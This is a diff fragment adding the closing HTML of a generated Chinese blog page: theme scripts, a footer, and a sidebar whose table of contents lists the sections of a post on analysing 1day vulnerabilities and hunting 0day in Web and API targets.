+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E5%BF%AB%E9%80%9F%E5%88%86%E6%9E%901day%E6%BC%8F%E6%B4%9E%E5%B9%B6%E6%8C%96%E6%8E%980day"><span class="nav-number">1.</span> <span class="nav-text">如何快速分析1day漏洞并挖掘0day</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%8E%B7%E5%8F%960-1day%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.</span> <span class="nav-text">获取0&#x2F;1day漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%86%E8%8A%82%E6%8F%90%E5%8F%96"><span class="nav-number">2.1.</span> <span class="nav-text">细节提取</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%90%9C%E7%B4%A2"><span class="nav-number">2.2.</span> <span class="nav-text">历史漏洞搜索</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BA%90%E7%A0%81%E8%8E%B7%E5%8F%96"><span class="nav-number">3.</span> <span class="nav-text">源码获取</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%88%86%E6%9E%90"><span class="nav-number">4.</span> <span class="nav-text">环境搭建与分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Web"><span class="nav-number">4.1.</span> <span class="nav-text">Web</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#API"><span class="nav-number">4.2.</span> <span class="nav-text">API</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%86%E6%9E%90%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E"><span class="nav-number">5.</span> <span class="nav-text">分析历史漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Web-1"><span class="nav-number">5.1.</span> <span class="nav-text">Web</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#API-1"><span class="nav-number">5.2.</span> <span class="nav-text">API</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><span class="nav-number">6.</span> <span class="nav-text">漏洞挖掘</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#web"><span class="nav-number">6.1.</span> <span class="nav-text">web</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#API-2"><span class="nav-number">6.2.</span> <span class="nav-text">API</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Y0ng"
+      src="/images/cys.jpg">
+  <p class="site-author-name" itemprop="name">Y0ng</p>
+  <div class="site-description" itemprop="description">花有重开日，人无再少年</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">108</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="mailto:1216043519@qq.com" title="E-Mail → mailto:1216043519@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Y0ng</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
